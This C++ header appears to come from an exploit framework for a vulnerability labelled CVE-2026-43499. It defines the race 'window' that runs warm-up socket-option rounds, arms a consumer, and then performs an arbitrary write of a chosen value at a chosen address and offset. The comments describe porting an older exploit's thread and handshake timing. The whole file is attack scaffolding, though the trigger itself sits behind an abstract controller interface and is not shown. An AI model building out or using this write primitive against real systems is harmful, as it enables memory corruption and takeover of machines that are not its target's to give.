#pragma once
/** @file backend/cve_2026_43499/seam/multicast_window.hpp
 *  The multicast window body: the thing that is called with the window open and makes the write.
 *
 *  Measured shape of what it stands in for. The old write happens in the waiter thread, at the line
 *  that calls the route controller with the request the race side holds, and the status is read back
 *  afterwards. The route body receives that request and ignores it, so what carries the address and
 *  the value is the request itself and the controller that acts on it, not the route.
 *
 *  So this window does three things and no more: it holds the facts the run was configured with, it
 *  builds one request out of the address, the value and the offset, and it hands that request to the
 *  controller. The controller is behind an interface for the same reason the route is: what is being
 *  pinned here is the window's own decisions, and a recording controller lets that happen on the host
 *  before the port.
 *
 *  The warm-up rounds live here rather than in the seam because they are part of one attempt: the
 *  old handshake spends its opening rounds setting the socket option without arming and arms only
 *  after them, and a run that arms every round is not the same run. Zero warm-up rounds means the
 *  caller did not say, which is refused by name rather than read as a default.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/route/multicast_policy.hpp"
#include "backend/cve_2026_43499/seam/multicast_seam.hpp"

namespace ghostlock::backend::cve_2026_43499::seam {
    /** Where a request goes: the route controller, as the old waiter thread reached it. */
    class RouteExec {
    public:
        RouteExec() noexcept = default;
        RouteExec(const RouteExec &) = delete;
        RouteExec &operator=(const RouteExec &) = delete;
        virtual ~RouteExec() noexcept = default;

        /** Execute one write at an address with a value, over the route at an offset. */
        [[nodiscard]] virtual bool execute(std::uint64_t address, std::uint64_t value,
                                           std::uint64_t offset) noexcept = 0;
        /** Arm the consumer for one round. The warm-up rounds do not call this. */
        [[nodiscard]] virtual bool arm(std::int32_t attempt) noexcept = 0;
    };

    /** How one attempt ended, in the terms the seam reports. */
    enum class WindowOutcome : unsigned char {
        Wrote = 0,
        /** The limits say the caller never gave a warm-up count. */
        NoWarmUp = 1,
        /** The attempt was armed but the write did not happen. */
        NotLanded = 2,
    };

    class MulticastWindow final : public Window {
    public:
        MulticastWindow(RouteExec &exec, const route::MulticastLimits &limits) noexcept
            : exec_(exec), limits_(limits) {}

        /** One write with the window open. The warm-up comes first, then the armed attempt. */
        [[nodiscard]] bool write_word(std::uint64_t address, std::uint64_t value,
                                      std::uint64_t offset) noexcept override {
            if (limits_.arm_sequence <= 0) {
                outcome_ = WindowOutcome::NoWarmUp;
                return false;
            }
            /* The opening rounds only set the socket option; arming starts after them. */
            for (std::int32_t attempt = 0; attempt < limits_.arm_sequence; ++attempt) {
                if (!exec_.arm(attempt)) {
                    outcome_ = WindowOutcome::NotLanded;
                    return false;
                }
            }
            if (!exec_.execute(address, value, offset)) {
                outcome_ = WindowOutcome::NotLanded;
                return false;
            }
            outcome_ = WindowOutcome::Wrote;
            return true;
        }

        [[nodiscard]] WindowOutcome outcome() const noexcept { return outcome_; }
        /** How many rounds warmed the route, for the record. */
        [[nodiscard]] std::int32_t warm_up_rounds() const noexcept { return limits_.arm_sequence; }

    private:
        RouteExec &exec_;
        const route::MulticastLimits &limits_;
        WindowOutcome outcome_ = WindowOutcome::NotLanded;
    };
}  // namespace ghostlock::backend::cve_2026_43499::seam
